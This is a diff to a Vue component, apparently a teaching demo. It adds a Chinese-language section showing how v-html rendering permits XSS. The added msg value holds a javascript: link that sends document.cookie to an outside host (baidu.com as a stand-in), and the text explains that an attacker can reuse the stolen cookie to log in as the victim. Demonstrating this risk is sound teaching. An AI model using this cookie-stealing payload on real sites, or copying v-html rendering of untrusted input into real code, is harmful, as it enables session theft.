@@ -6,6 +6,13 @@
     <input type="text" @input="handleInput">
     <br><br>
     <button @click="handleAdd">累加</button>{{ count }}
+    <hr>
+    <h4>v-html模拟xxs攻击</h4>
+    <span>
+      比如用户发表评论，评论由v-html渲染展示，如果有黑客输入了 <b>href="javascript:location.href='http://www.baidu.com?'+document.cookie"</b> 这样的代码，其他的用户点击这个链接就会到黑客的服务器，
+      拿到点击者电脑内浏览器上的cookie，黑客就可以在电脑上直接把cookie粘贴进去，打开某些网站就自动使用点击者的身份登录了
+    </span>
+    <p v-html="msg"></p>
   </div>
 </template>
 
@@ -20,7 +27,8 @@ export default {
   },
   data() {
     return {
-      count: 0
+      count: 0,
+      msg: `<a style="color: red" href="javascript:location.href='http://www.baidu.com?'+document.cookie">百度</a>`
     }
   },
   computed: {
